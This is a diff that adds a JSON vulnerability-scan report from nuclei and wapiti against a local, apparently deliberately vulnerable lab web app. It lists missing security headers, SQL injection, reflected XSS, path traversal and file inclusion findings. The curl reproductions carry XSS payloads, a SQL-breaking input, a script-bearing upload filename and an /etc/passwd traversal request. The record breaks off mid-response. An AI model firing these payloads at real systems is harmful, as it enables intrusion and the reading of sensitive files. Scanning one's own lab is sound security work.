@@ -1,0 +1,1578 @@
+{
+  "target": "192.168.64.2",
+  "startedAt": "2025-12-30T10:34:29.894664",
+  "finishedAt": "2025-12-30T10:34:29.894708",
+  "tools": [
+    "nuclei",
+    "wapiti"
+  ],
+  "findings": [
+    {
+      "id": "wapiti-Content Security Policy Configuration-0",
+      "tool": "wapiti",
+      "category": "Content Security Policy Configuration",
+      "severity": "low",
+      "title": "Content Security Policy Configuration",
+      "description": "CSP is not set for URL: http://192.168.64.2:9991/www/SQL/sql1.php",
+      "endpoint": "/www/SQL/sql1.php",
+      "fullUrl": "/www/SQL/sql1.php",
+      "method": "",
+      "parameter": "",
+      "evidence": "",
+      "recommendation": "",
+      "wstg": [
+        "WSTG-CONF-12",
+        "OSHP-Content-Security-Policy"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/WSTG-CONF-12",
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/OSHP-Content-Security-Policy"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/SQL/sql1.php\""
+    },
+    {
+      "id": "wapiti-Clickjacking Protection-1",
+      "tool": "wapiti",
+      "category": "Clickjacking Protection",
+      "severity": "low",
+      "title": "Clickjacking Protection",
+      "description": "X-Frame-Options is not set",
+      "endpoint": "/www/SQL/sql1.php",
+      "fullUrl": "/www/SQL/sql1.php",
+      "method": "",
+      "parameter": "",
+      "evidence": "",
+      "recommendation": "",
+      "wstg": [
+        "OSHP-X-Frame-Options"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/OSHP-X-Frame-Options"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/SQL/sql1.php\""
+    },
+    {
+      "id": "wapiti-MIME Type Confusion-2",
+      "tool": "wapiti",
+      "category": "MIME Type Confusion",
+      "severity": "low",
+      "title": "MIME Type Confusion",
+      "description": "X-Content-Type-Options is not set",
+      "endpoint": "/www/SQL/sql1.php",
+      "fullUrl": "/www/SQL/sql1.php",
+      "method": "",
+      "parameter": "",
+      "evidence": "",
+      "recommendation": "",
+      "wstg": [
+        "OSHP-X-Content-Type-Options"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/OSHP-X-Content-Type-Options"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/SQL/sql1.php\""
+    },
+    {
+      "id": "wapiti-Unencrypted Channels-3",
+      "tool": "wapiti",
+      "category": "Unencrypted Channels",
+      "severity": "low",
+      "title": "Unencrypted Channels",
+      "description": "No HTTPS redirection for this host. All HTTP requests are served in clear text.",
+      "endpoint": "/www/SQL/sql1.php",
+      "fullUrl": "/www/SQL/sql1.php",
+      "method": "",
+      "parameter": "",
+      "evidence": "",
+      "recommendation": "",
+      "wstg": [
+        "WSTG-CRYP-03"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/WSTG-CRYP-03"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/SQL/sql1.php\""
+    },
+    {
+      "id": "wapiti-Unencrypted Channels-4",
+      "tool": "wapiti",
+      "category": "Unencrypted Channels",
+      "severity": "low",
+      "title": "Unencrypted Channels",
+      "description": "Sensitive data (POST data) was sent over an unencrypted HTTP connection to http://192.168.64.2:9991/www/SQL/sql1.php. The server did not enforce HTTPS.",
+      "endpoint": "/www/SQL/sql1.php",
+      "fullUrl": "/www/SQL/sql1.php",
+      "method": "",
+      "parameter": "",
+      "evidence": "",
+      "recommendation": "",
+      "wstg": [
+        "WSTG-CRYP-03"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/WSTG-CRYP-03"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/SQL/sql1.php\" -e \"http://192.168.64.2:9991/www/SQL/sql1.php\" -d \"firstname=default&submit=Submit\""
+    },
+    {
+      "id": "wapiti-SQL Injection-5",
+      "tool": "wapiti",
+      "category": "SQL Injection",
+      "severity": "low",
+      "title": "SQL Injection",
+      "description": "SQL Injection (DBMS: MySQL) via injection in the parameter firstname",
+      "endpoint": "/www/SQL/sql1.php",
+      "fullUrl": "/www/SQL/sql1.php",
+      "method": "",
+      "parameter": "firstname",
+      "evidence": "firstname",
+      "recommendation": "",
+      "wstg": [
+        "WSTG-INPV-05"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/WSTG-INPV-05"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/SQL/sql1.php\" -e \"http://192.168.64.2:9991/www/SQL/sql1.php\" -d \"firstname=default%C2%BF%27%22%28&submit=Submit\""
+    },
+    {
+      "id": "wapiti-Content Security Policy Configuration-6",
+      "tool": "wapiti",
+      "category": "Content Security Policy Configuration",
+      "severity": "low",
+      "title": "Content Security Policy Configuration",
+      "description": "CSP is not set for URL: http://192.168.64.2:9991/www/FileUpload/fileupload1.php",
+      "endpoint": "/www/FileUpload/fileupload1.php",
+      "fullUrl": "/www/FileUpload/fileupload1.php",
+      "method": "",
+      "parameter": "",
+      "evidence": "",
+      "recommendation": "",
+      "wstg": [
+        "WSTG-CONF-12",
+        "OSHP-Content-Security-Policy"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/WSTG-CONF-12",
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/OSHP-Content-Security-Policy"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/FileUpload/fileupload1.php\""
+    },
+    {
+      "id": "wapiti-Path Traversal-7",
+      "tool": "wapiti",
+      "category": "Path Traversal",
+      "severity": "low",
+      "title": "Path Traversal",
+      "description": "Possible move_uploaded_file() vulnerability via injection in the parameter file (Constraints: prefix)",
+      "endpoint": "/www/FileUpload/fileupload1.php",
+      "fullUrl": "/www/FileUpload/fileupload1.php",
+      "method": "",
+      "parameter": "file",
+      "evidence": "file",
+      "recommendation": "",
+      "wstg": [
+        "WSTG-ATHZ-01"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/WSTG-ATHZ-01"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/FileUpload/fileupload1.php\" -e \"http://192.168.64.2:9991/www/FileUpload/fileupload1.php\" -F \"submit=Submit\" -F \"file=@your_local_file;filename=fileupload1.php\""
+    },
+    {
+      "id": "wapiti-Clickjacking Protection-8",
+      "tool": "wapiti",
+      "category": "Clickjacking Protection",
+      "severity": "low",
+      "title": "Clickjacking Protection",
+      "description": "X-Frame-Options is not set",
+      "endpoint": "/www/FileUpload/fileupload1.php",
+      "fullUrl": "/www/FileUpload/fileupload1.php",
+      "method": "",
+      "parameter": "",
+      "evidence": "",
+      "recommendation": "",
+      "wstg": [
+        "OSHP-X-Frame-Options"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/OSHP-X-Frame-Options"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/FileUpload/fileupload1.php\""
+    },
+    {
+      "id": "wapiti-MIME Type Confusion-9",
+      "tool": "wapiti",
+      "category": "MIME Type Confusion",
+      "severity": "low",
+      "title": "MIME Type Confusion",
+      "description": "X-Content-Type-Options is not set",
+      "endpoint": "/www/FileUpload/fileupload1.php",
+      "fullUrl": "/www/FileUpload/fileupload1.php",
+      "method": "",
+      "parameter": "",
+      "evidence": "",
+      "recommendation": "",
+      "wstg": [
+        "OSHP-X-Content-Type-Options"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/OSHP-X-Content-Type-Options"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/FileUpload/fileupload1.php\""
+    },
+    {
+      "id": "wapiti-Unencrypted Channels-10",
+      "tool": "wapiti",
+      "category": "Unencrypted Channels",
+      "severity": "low",
+      "title": "Unencrypted Channels",
+      "description": "No HTTPS redirection for this host. All HTTP requests are served in clear text.",
+      "endpoint": "/www/FileUpload/fileupload1.php",
+      "fullUrl": "/www/FileUpload/fileupload1.php",
+      "method": "",
+      "parameter": "",
+      "evidence": "",
+      "recommendation": "",
+      "wstg": [
+        "WSTG-CRYP-03"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/WSTG-CRYP-03"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/FileUpload/fileupload1.php\""
+    },
+    {
+      "id": "wapiti-Unencrypted Channels-11",
+      "tool": "wapiti",
+      "category": "Unencrypted Channels",
+      "severity": "low",
+      "title": "Unencrypted Channels",
+      "description": "Sensitive data (POST data) was sent over an unencrypted HTTP connection to http://192.168.64.2:9991/www/FileUpload/fileupload1.php. The server did not enforce HTTPS.",
+      "endpoint": "/www/FileUpload/fileupload1.php",
+      "fullUrl": "/www/FileUpload/fileupload1.php",
+      "method": "",
+      "parameter": "",
+      "evidence": "",
+      "recommendation": "",
+      "wstg": [
+        "WSTG-CRYP-03"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/WSTG-CRYP-03"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/FileUpload/fileupload1.php\" -e \"http://192.168.64.2:9991/www/FileUpload/fileupload1.php\" -F \"submit=Submit\" -F \"file=@your_local_file;filename=pix.gif\""
+    },
+    {
+      "id": "wapiti-Information Disclosure - Full Path-12",
+      "tool": "wapiti",
+      "category": "Information Disclosure - Full Path",
+      "severity": "low",
+      "title": "Information Disclosure - Full Path",
+      "description": "Response contains potential system path: /opt/lampp/temp/phpdKTJ3b",
+      "endpoint": "/www/FileUpload/fileupload1.php",
+      "fullUrl": "/www/FileUpload/fileupload1.php",
+      "method": "",
+      "parameter": "",
+      "evidence": "",
+      "recommendation": "",
+      "wstg": [
+        "WSTG-ERRH-01"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/WSTG-ERRH-01"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/FileUpload/fileupload1.php\" -e \"http://192.168.64.2:9991/www/FileUpload/fileupload1.php\" -F \"submit=Submit\" -F \"file=@your_local_file;filename=pix.gif\""
+    },
+    {
+      "id": "wapiti-Reflected Cross Site Scripting-13",
+      "tool": "wapiti",
+      "category": "Reflected Cross Site Scripting",
+      "severity": "low",
+      "title": "Reflected Cross Site Scripting",
+      "description": "Reflected Cross Site Scripting vulnerability found via injection in the parameter file",
+      "endpoint": "/www/FileUpload/fileupload1.php",
+      "fullUrl": "/www/FileUpload/fileupload1.php",
+      "method": "",
+      "parameter": "file",
+      "evidence": "file",
+      "recommendation": "",
+      "wstg": [
+        "WSTG-INPV-01"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/WSTG-INPV-01"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/FileUpload/fileupload1.php\" -e \"http://192.168.64.2:9991/www/FileUpload/fileupload1.php\" -F \"submit=Submit\" -F \"file=@your_local_file;filename=<ImG src=z oNeRror=alert('wq7z5o30by')>\""
+    },
+    {
+      "id": "wapiti-Content Security Policy Configuration-14",
+      "tool": "wapiti",
+      "category": "Content Security Policy Configuration",
+      "severity": "low",
+      "title": "Content Security Policy Configuration",
+      "description": "CSP is not set for URL: http://192.168.64.2:9991/www/XSS/XSS_level2.php",
+      "endpoint": "/www/XSS/XSS_level2.php",
+      "fullUrl": "/www/XSS/XSS_level2.php",
+      "method": "",
+      "parameter": "",
+      "evidence": "",
+      "recommendation": "",
+      "wstg": [
+        "WSTG-CONF-12",
+        "OSHP-Content-Security-Policy"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/WSTG-CONF-12",
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/OSHP-Content-Security-Policy"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/XSS/XSS_level2.php\""
+    },
+    {
+      "id": "wapiti-Clickjacking Protection-15",
+      "tool": "wapiti",
+      "category": "Clickjacking Protection",
+      "severity": "low",
+      "title": "Clickjacking Protection",
+      "description": "X-Frame-Options is not set",
+      "endpoint": "/www/XSS/XSS_level2.php",
+      "fullUrl": "/www/XSS/XSS_level2.php",
+      "method": "",
+      "parameter": "",
+      "evidence": "",
+      "recommendation": "",
+      "wstg": [
+        "OSHP-X-Frame-Options"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/OSHP-X-Frame-Options"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/XSS/XSS_level2.php\""
+    },
+    {
+      "id": "wapiti-MIME Type Confusion-16",
+      "tool": "wapiti",
+      "category": "MIME Type Confusion",
+      "severity": "low",
+      "title": "MIME Type Confusion",
+      "description": "X-Content-Type-Options is not set",
+      "endpoint": "/www/XSS/XSS_level2.php",
+      "fullUrl": "/www/XSS/XSS_level2.php",
+      "method": "",
+      "parameter": "",
+      "evidence": "",
+      "recommendation": "",
+      "wstg": [
+        "OSHP-X-Content-Type-Options"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/OSHP-X-Content-Type-Options"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/XSS/XSS_level2.php\""
+    },
+    {
+      "id": "wapiti-Unencrypted Channels-17",
+      "tool": "wapiti",
+      "category": "Unencrypted Channels",
+      "severity": "low",
+      "title": "Unencrypted Channels",
+      "description": "No HTTPS redirection for this host. All HTTP requests are served in clear text.",
+      "endpoint": "/www/XSS/XSS_level2.php",
+      "fullUrl": "/www/XSS/XSS_level2.php",
+      "method": "",
+      "parameter": "",
+      "evidence": "",
+      "recommendation": "",
+      "wstg": [
+        "WSTG-CRYP-03"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/WSTG-CRYP-03"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/XSS/XSS_level2.php\""
+    },
+    {
+      "id": "wapiti-Unencrypted Channels-18",
+      "tool": "wapiti",
+      "category": "Unencrypted Channels",
+      "severity": "low",
+      "title": "Unencrypted Channels",
+      "description": "Sensitive data (GET parameters) was sent over an unencrypted HTTP connection to http://192.168.64.2:9991/www/XSS/XSS_level2.php?username=alice&submit=Submit. The server did not enforce HTTPS.",
+      "endpoint": "/www/XSS/XSS_level2.php",
+      "fullUrl": "/www/XSS/XSS_level2.php",
+      "method": "",
+      "parameter": "",
+      "evidence": "",
+      "recommendation": "",
+      "wstg": [
+        "WSTG-CRYP-03"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/WSTG-CRYP-03"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/XSS/XSS_level2.php?username=alice&submit=Submit\" -e \"http://192.168.64.2:9991/www/XSS/XSS_level2.php\""
+    },
+    {
+      "id": "wapiti-Reflected Cross Site Scripting-19",
+      "tool": "wapiti",
+      "category": "Reflected Cross Site Scripting",
+      "severity": "low",
+      "title": "Reflected Cross Site Scripting",
+      "description": "Reflected Cross Site Scripting vulnerability found via injection in the parameter username",
+      "endpoint": "/www/XSS/XSS_level2.php",
+      "fullUrl": "/www/XSS/XSS_level2.php",
+      "method": "",
+      "parameter": "username",
+      "evidence": "username",
+      "recommendation": "",
+      "wstg": [
+        "WSTG-INPV-01"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/WSTG-INPV-01"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/XSS/XSS_level2.php?username=%3CScRiPt%3Ealert%28%27w6niwexcjj%27%29%3C%2FsCrIpT%3E&submit=Submit\" -e \"http://192.168.64.2:9991/www/XSS/XSS_level2.php\""
+    },
+    {
+      "id": "wapiti-Content Security Policy Configuration-20",
+      "tool": "wapiti",
+      "category": "Content Security Policy Configuration",
+      "severity": "low",
+      "title": "Content Security Policy Configuration",
+      "description": "CSP is not set for URL: http://192.168.64.2:9991/www/SQL/sql2.php",
+      "endpoint": "/www/SQL/sql2.php",
+      "fullUrl": "/www/SQL/sql2.php",
+      "method": "",
+      "parameter": "",
+      "evidence": "",
+      "recommendation": "",
+      "wstg": [
+        "WSTG-CONF-12",
+        "OSHP-Content-Security-Policy"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/WSTG-CONF-12",
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/OSHP-Content-Security-Policy"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/SQL/sql2.php\""
+    },
+    {
+      "id": "wapiti-Clickjacking Protection-21",
+      "tool": "wapiti",
+      "category": "Clickjacking Protection",
+      "severity": "low",
+      "title": "Clickjacking Protection",
+      "description": "X-Frame-Options is not set",
+      "endpoint": "/www/SQL/sql2.php",
+      "fullUrl": "/www/SQL/sql2.php",
+      "method": "",
+      "parameter": "",
+      "evidence": "",
+      "recommendation": "",
+      "wstg": [
+        "OSHP-X-Frame-Options"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/OSHP-X-Frame-Options"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/SQL/sql2.php\""
+    },
+    {
+      "id": "wapiti-MIME Type Confusion-22",
+      "tool": "wapiti",
+      "category": "MIME Type Confusion",
+      "severity": "low",
+      "title": "MIME Type Confusion",
+      "description": "X-Content-Type-Options is not set",
+      "endpoint": "/www/SQL/sql2.php",
+      "fullUrl": "/www/SQL/sql2.php",
+      "method": "",
+      "parameter": "",
+      "evidence": "",
+      "recommendation": "",
+      "wstg": [
+        "OSHP-X-Content-Type-Options"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/OSHP-X-Content-Type-Options"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/SQL/sql2.php\""
+    },
+    {
+      "id": "wapiti-Unencrypted Channels-23",
+      "tool": "wapiti",
+      "category": "Unencrypted Channels",
+      "severity": "low",
+      "title": "Unencrypted Channels",
+      "description": "No HTTPS redirection for this host. All HTTP requests are served in clear text.",
+      "endpoint": "/www/SQL/sql2.php",
+      "fullUrl": "/www/SQL/sql2.php",
+      "method": "",
+      "parameter": "",
+      "evidence": "",
+      "recommendation": "",
+      "wstg": [
+        "WSTG-CRYP-03"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/WSTG-CRYP-03"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/SQL/sql2.php\""
+    },
+    {
+      "id": "wapiti-Unencrypted Channels-24",
+      "tool": "wapiti",
+      "category": "Unencrypted Channels",
+      "severity": "low",
+      "title": "Unencrypted Channels",
+      "description": "Sensitive data (POST data) was sent over an unencrypted HTTP connection to http://192.168.64.2:9991/www/SQL/sql2.php. The server did not enforce HTTPS.",
+      "endpoint": "/www/SQL/sql2.php",
+      "fullUrl": "/www/SQL/sql2.php",
+      "method": "",
+      "parameter": "",
+      "evidence": "",
+      "recommendation": "",
+      "wstg": [
+        "WSTG-CRYP-03"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/WSTG-CRYP-03"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/SQL/sql2.php\" -e \"http://192.168.64.2:9991/www/SQL/sql2.php\" -d \"number=default&submit=Submit\""
+    },
+    {
+      "id": "wapiti-Reflected Cross Site Scripting-25",
+      "tool": "wapiti",
+      "category": "Reflected Cross Site Scripting",
+      "severity": "low",
+      "title": "Reflected Cross Site Scripting",
+      "description": "Reflected Cross Site Scripting vulnerability found via injection in the parameter number",
+      "endpoint": "/www/SQL/sql2.php",
+      "fullUrl": "/www/SQL/sql2.php",
+      "method": "",
+      "parameter": "number",
+      "evidence": "number",
+      "recommendation": "",
+      "wstg": [
+        "WSTG-INPV-01"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/WSTG-INPV-01"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/SQL/sql2.php\" -e \"http://192.168.64.2:9991/www/SQL/sql2.php\" -d \"number=%3CScRiPt%3Ealert%28%27wqf04zb5ob%27%29%3C%2FsCrIpT%3E&submit=Submit\""
+    },
+    {
+      "id": "nuclei-xss-26",
+      "tool": "nuclei",
+      "category": "XSS",
+      "severity": "medium",
+      "title": "Fuzzing Parameters - Cross-Site Scripting",
+      "description": "Cross-site scripting was discovered via a search for reflected parameter values in the server response via GET-requests.\n",
+      "impact": "N/A",
+      "endpoint": "http://192.168.64.2:9991/www/FileInclusion/pages/lvl2.php/",
+      "fullUrl": "http://192.168.64.2:9991/www/FileInclusion/pages/lvl2.php/?order_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-order_id%27%29%3E&cookie=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-cookie%27%29%3E&debug=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-debug%27%29%3E&m=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-m%27%29%3E&dir=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-dir%27%29%3E&new_role=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-new_role%27%29%3E&trashed=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-trashed%27%29%3E&log=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-log%27%29%3E&excerpt=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-excerpt%27%29%3E&settings-updated=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-settings-updated%27%29%3E&plugins=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-plugins%27%29%3E&modify=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-modify%27%29%3E&pwd=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-pwd%27%29%3E&file=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-file%27%29%3E",
+      "method": "GET",
+      "cve": null,
+      "evidence": "",
+      "recommendation": "",
+      "references": [],
+      "request": "GET /www/FileInclusion/pages/lvl2.php/?order_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-order_id%27%29%3E&cookie=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-cookie%27%29%3E&debug=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-debug%27%29%3E&m=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-m%27%29%3E&dir=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-dir%27%29%3E&new_role=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-new_role%27%29%3E&trashed=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-trashed%27%29%3E&log=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-log%27%29%3E&excerpt=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-excerpt%27%29%3E&settings-updated=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-settings-updated%27%29%3E&plugins=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-plugins%27%29%3E&modify=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-modify%27%29%3E&pwd=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-pwd%27%29%3E&file=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-file%27%29%3E HTTP/1.1\r\nHost: 192.168.64.2:9991\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:1.9.7.20) Gecko/ Firefox/3.6.15\r\nAccept: */*\r\nAccept-Language: en\r\nAccept-Encoding: gzip\r\n\r\n",
+      "response": "HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Length: 848\r\nContent-Type: text/html; charset=UTF-8\r\nDate: Tue, 30 Dec 2025 10:22:05 GMT\r\nServer: Apache/2.4.18 (Unix) OpenSSL/1.0.2h PHP/5.6.21 mod_perl/2.0.8-dev Perl/v5.16.3\r\nX-Powered-By: PHP/5.6.21\r\n\r\n<html>  \r\n   <head>\r\n      <meta charset=\"utf-8\">\r\n      <link rel=\"shortcut icon\" href=\"../../Resources/hmbct.png\" />\r\n      <title> Level 2 </title>\r\n   </head>\r\n\r\n   <body>\r\n      <div style=\"background-color:#c9c9c9;padding:15px;\">\r\n      <button type=\"button\" name=\"homeButton\" onclick=\"location.href='../../homepage.html';\">Home Page</button>\r\n      <button type=\"button\" name=\"mainButton\" onclick=\"location.href='fileinc.html';\">Main Page</button>   \r\n      </div>\r\n      \r\n      <div align=\"center\"><b><h3>This is Level 2</h3></b></div>\r\n      <div align=\"center\">\r\n      <a href=lvl2.php?file=1.php><button>Button</button></a>\r\n      <a href=lvl2.php?file=2.php><button>The Other Button!</button></a>\r\n      </div>\r\n      \r\n      </br></br><div align='center'><b><h5>'>\"<svg/onload=confirm('xss-file')></h5></b></div>    </body>\r\n</html>\r\n",
+      "curlCommand": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:1.9.7.20) Gecko/ Firefox/3.6.15' 'http://192.168.64.2:9991/www/FileInclusion/pages/lvl2.php/?order_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-order_id%27%29%3E&cookie=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-cookie%27%29%3E&debug=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-debug%27%29%3E&m=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-m%27%29%3E&dir=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-dir%27%29%3E&new_role=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-new_role%27%29%3E&trashed=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-trashed%27%29%3E&log=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-log%27%29%3E&excerpt=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-excerpt%27%29%3E&settings-updated=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-settings-updated%27%29%3E&plugins=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-plugins%27%29%3E&modify=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-modify%27%29%3E&pwd=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-pwd%27%29%3E&file=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-file%27%29%3E'",
+      "ip": "192.168.64.2"
+    },
+    {
+      "id": "nuclei-xss-27",
+      "tool": "nuclei",
+      "category": "XSS",
+      "severity": "high",
+      "title": "Centos Web Panel 0.9.8.480 - Local File Inclusion",
+      "description": "Centos Web Panel version 0.9.8.480 suffers from local file inclusion vulnerabilities. Other vulnerabilities including cross-site scripting and remote code execution are also known to impact this version.\n",
+      "impact": "Successful exploitation of this vulnerability allows an attacker to read sensitive files on the server.\n",
+      "endpoint": "http://192.168.64.2:9991/www/FileInclusion/pages/lvl2.php/admin/index.php",
+      "fullUrl": "http://192.168.64.2:9991/www/FileInclusion/pages/lvl2.php/admin/index.php?module=file_editor&file=/../../../../../../../../../../../etc/passwd",
+      "method": "GET",
+      "cve": "cve-2018-18323",
+      "evidence": "",
+      "recommendation": "",
+      "references": [],
+      "request": "GET /www/FileInclusion/pages/lvl2.php/admin/index.php?module=file_editor&file=/../../../../../../../../../../../etc/passwd HTTP/1.1\r\nHost: 192.168.64.2:9991\r\nUser-Agent: Mozilla/5.0 (Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36\r\nConnection: close\r\nAccept: */*\r\nAccept-Language: en\r\nAccept-Encoding: gzip\r\n\r\n",
+      "response": "HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Length: 2155\r\nContent-Type: text/html; charset=UTF-8\r\nDate: Tue, 30 Dec 2025 10:22:22 GMT\r\nServer: Apache/2.4.18 (Unix) OpenSSL/1.0.2h PHP/5.6.21 mod_perl/2.0.8-dev Perl/v5.16.3\r\nX-Powered-By: PHP/5.6.21\r\n\r\n<html>  \r\n   <head>\r\n      <meta charset=\"utf-8\">\r\n      <link rel=\"shortcut icon\" href=\"../../Resources/hmbct.png\" />\r\n      <title> Level 2 </title>\r\n   </head>\r\n\r\n   <body>\r\n      <div style=\"background-color:#c9c9c9;padding:15px;\">\r\n      <button type=\"button\" name=\"homeButton\" onclick=\"location.href='../../homepage.html';\">Home Page</button>\r\n      <button type=\"button\" name=\"mainButton\" onclick=\"location.href='fileinc.html';\">Main Page</button>   \r\n      </div>\r\n      \r\n      <div align=\"center\"><b><h3>This is Level 2</h3></b></div>\r\n      <div align=\"center\">\r\n      <a href=lvl2.php?file=1.php><button>Button</button></a>\r\n      <a href=lvl2.php?file=2.php><button>The Other Button!</button></a>\r\n      </div>\r\n      \r\n      